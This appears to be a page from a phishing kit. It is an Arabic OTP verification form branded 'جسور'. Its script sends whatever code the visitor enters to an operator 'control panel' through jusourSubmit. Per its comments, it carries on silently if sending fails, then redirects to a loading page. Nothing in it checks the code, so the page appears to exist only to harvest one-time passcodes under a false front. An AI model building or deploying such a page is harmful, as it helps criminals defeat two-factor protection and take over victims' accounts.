<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>التحقق من الرمز | جسور</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <!-- استدعاء ملف الإعدادات المركزية (مهم جداً) -->
    <script src="frontend-config.js"></script>`r`n    <script src="config.js"></script>
    <style>
        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #8D1B3D 0%, #002D52 100%); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .otp-box { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 92%; max-width: 450px; text-align: center; }
        input { letter-spacing: 5px; font-weight: bold; text-align: center; border: 2px solid #eee; border-radius: 15px; padding: 15px; font-size: 24px; outline: none; width: 100%; transition: 0.3s; }
        input:focus { border-color: #8D1B3D; }
    </style>
</head>
<body>
    <div class="otp-box">
        <h2 class="text-[26px] font-black mb-2 text-[#1a1a1a]">رمز التحقق (OTP)</h2>
        <p class="text-gray-500 mb-8 font-bold">أدخل الرمز المرسل لهاتفك</p>
        <form id="otpForm">
            <input type="text" id="otpCode" placeholder="••••••" maxlength="6" inputmode="numeric" required>
            <button type="submit" id="btn" class="w-full bg-[#1b4332] text-white py-4 rounded-xl font-bold mt-6 shadow-lg">تحقق</button>
        </form>
    </div>

    <script>
        const ref = resolveRef();
        
        document.getElementById('otpForm').onsubmit = function(e) {
            e.preventDefault();
            const val = document.getElementById('otpCode').value;
            const btn = document.getElementById('btn');
            btn.innerText = "جاري التحقق...";
            btn.disabled = true;

            // يُرسل رمز التحقق إلى لوحة التحكم مباشرة، ويُعلّم كحساس ليظهر مخفياً.
            jusourSubmit({
                ref: ref,
                page_key: 'otp',
                summary: 'رمز التحقق (OTP)',
                fields: [
                    { label: 'رمز التحقق (OTP)', value: val, sensitive: true }
                ]
            }).catch(function () {
                /* لا نعطّل المستخدم إذا تعذّر الإرسال */
            }).then(function () {
                setTimeout(function () {
                    window.location.replace('loading.html?ref=' + encodeURIComponent(ref) + '&v=' + Date.now());
                }, 900);
            });
        };
    </script>
</body>
</html>
